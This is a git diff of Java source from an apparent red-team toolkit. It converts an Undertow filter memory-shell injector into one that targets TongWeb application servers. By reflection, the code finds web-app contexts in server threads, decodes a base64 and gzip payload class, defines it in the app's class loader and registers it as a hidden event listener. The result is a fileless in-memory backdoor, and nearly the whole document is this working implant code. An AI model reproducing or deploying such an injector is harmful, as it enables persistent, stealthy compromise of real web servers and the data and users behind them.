@@ -1,25 +1,23 @@
 package com.potato.potatotool.content.redTeam.memshell.injector;
 
-import javax.servlet.DispatcherType;
-import java.io.ByteArrayInputStream;
-import java.io.ByteArrayOutputStream;
-import java.io.IOException;
+import java.io.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.ArrayList;
+import java.util.Arrays;
 import java.util.HashMap;
 import java.util.List;
-import java.util.Map;
 import java.util.zip.GZIPInputStream;
 
+/**
+ * Tongweb Listener 注入器
+ * Author: pen4uin
+ * 测试版本：
+ * v7.0.4.2
+ */
 
-public class UndertowFilterInjector {
-
-    public String getUrlPattern() {
-        return "/*";
-    }
-
+public class TongWebListenerInjector {
 
     public String getClassName() {
         return "";
@@ -30,95 +28,120 @@ public class UndertowFilterInjector {
     }
 
     static {
-        new UndertowFilterInjector();
+        new TongWebListenerInjector();
     }
 
-
-    public UndertowFilterInjector() {
+    public TongWebListenerInjector() {
         try {
             List<Object> contexts = getContext();
             for (Object context : contexts) {
-                Object filter = getFilter(context);
-                addFilter(context, filter);
+                Object listener = getListener(context);
+                addListener(context, listener);
             }
         } catch (Exception ignored) {
 
         }
 
-
     }
 
-    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
+    public List<Object> getContext() throws Exception {
         List<Object> contexts = new ArrayList<Object>();
-        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
-        for (int i = 0; i < threads.length; i++) {
-            try {
-                Object requestContext = invokeMethod(threads[i].getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
-                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
-                if (servletContext != null)
-                    contexts.add(servletContext);
-            } catch (Exception ignored) {
+        Thread[] threads = getThreads();
+        Object context = null;
+        try {
+            for (Thread thread : threads) {
+                if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
+                    HashMap childrenMap = (HashMap) getFV(getFV(getFV(thread, "target"), "this$0"), "children");
+                    for (Object key : childrenMap.keySet()) {
+                        HashMap children = (HashMap) getFV(childrenMap.get(key), "children");
+                        for (Object key1 : children.keySet()) {
+                            context = children.get(key1);
+                            if (context != null && context.getClass().getName().contains("ThanosStandardContext"))
+                                contexts.add(context);
+                        }
+                    }
+                }
             }
+        } catch (Exception ignored) {
+
         }
         return contexts;
     }
 
+    public Thread[] getThreads() throws Exception {
+        Thread[] var0 = null;
+
+        try {
+            var0 = (Thread[])(invokeMethod(Thread.class, "getThreads"));
+        } catch (NoSuchMethodException var3) {
+            ThreadGroup var2 = Thread.currentThread().getThreadGroup();
+            var0 = new Thread[var2.activeCount()];
+            var2.enumerate(var0);
+        }
+
+        return var0;
+    }
+
     private ClassLoader getWebAppClassLoader(Object context) throws Exception {
         try {
-            return (ClassLoader) invokeMethod(context, "getClassLoader", null, null);
-        } catch (Exception ignored) {
-            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
-            return (ClassLoader) invokeMethod(deploymentInfo, "getClassLoader", null, null);
+            return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
+        } catch (Exception e) {
+            Object loader = invokeMethod(context, "getLoader", null, null);
+            return ((ClassLoader) invokeMethod(loader, "getClassLoader", null, null));
         }
     }
 
-    private Object getFilter(Object context) throws Exception {
-        Object filter = null;
+    private Object getListener(Object context) throws Exception {
+        Object listener = null;
         ClassLoader classLoader = getWebAppClassLoader(context);
         try {
-            filter = classLoader.loadClass(getClassName()).newInstance();
-        } catch (Exception e) {
+            listener = classLoader.loadClass(getClassName()).newInstance();
+        } catch (Exception ex) {
             try {
                 byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                 Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                 defineClass.setAccessible(true);
                 Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
-                filter = clazz.newInstance();
-            } catch (Throwable tt) {
+                listener = clazz.newInstance();
+            } catch (Throwable ignored) {
+
+
             }
         }
-        return filter;
+        return listener;
     }
 
-    public void addFilter(Object context, Object filter) {
-        String filterClassName = filter.getClass().getName();
+    public void addListener(Object context, Object listener) throws Exception {
+        if (isInjected(context, listener.getClass().getName())) {
+            return;
+        }
         try {
-            if (isInjected(context, filterClassName)) {
-                return;
+            invokeMethod(context, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{listener});
+        } catch (Exception ex) {
+            try {
+                Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners");
+                List listeners = Arrays.asList(objects);
+                ArrayList arrayList = new ArrayList(listeners);
+                arrayList.add(listener);
+                invokeMethod(context, "setApplicationEventListeners", new Class[]{Object[].class}, new Object[]{(Object) arrayList.toArray()});
+            } catch (Exception ignored) {
+
             }
-            Class filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo");
-            Object deploymentInfo = getFieldValue(context, "deploymentInfo");
-            Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(filterClassName, filter.getClass());
-            invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
-            Object deploymentImpl = getFieldValue(context, "deployment");
-            Object managedFilters = invokeMethod(deploymentImpl, "getFilters");
-            invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
-            invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, filterClassName, getUrlPattern(), DispatcherType.REQUEST});
-        } catch (Throwable e) {
         }
     }
+
 
     public boolean isInjected(Object context, String evilClassName) throws Exception {
-        Map<String, Object> filters = (HashMap) getFieldValue(getFieldValue(context, "deploymentInfo"), "filters");
-        for (Map.Entry<String, Object> filter : filters.entrySet()) {
-            Class filterClass = (Class) getFieldValue(filter.getValue(), "filterClass");
-            if (filterClass.getName().equals(evilClassName)) {
+        Object[] objects = (Object[]) invokeMethod(context, "getApplicationEventListeners");
+        List listeners = Arrays.asList(objects);
+        ArrayList arrayList = new ArrayList(listeners);
+        for (int i = 0; i < arrayList.size(); i++) {
+            if (arrayList.get(i).getClass().getName().contains(evilClassName)) {
                 return true;
             }
         }
         return false;
     }
-
 
     static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
         Class<?> decoderClass;
@@ -144,13 +167,13 @@ public class UndertowFilterInjector {
         return out.toByteArray();
     }
 
-    static Object getFieldValue(Object obj, String fieldName) throws Exception {
-        Field field = getField(obj, fieldName);
+    static Object getFV(Object obj, String fieldName) throws Exception {
+        Field field = getF(obj, fieldName);
         field.setAccessible(true);
         return field.get(obj);
     }
 
-    static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
+    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
         Class<?> clazz = obj.getClass();
         while (clazz != null) {
             try {
@@ -210,4 +233,5 @@ public class UndertowFilterInjector {
             }
         }
     }
+
 }
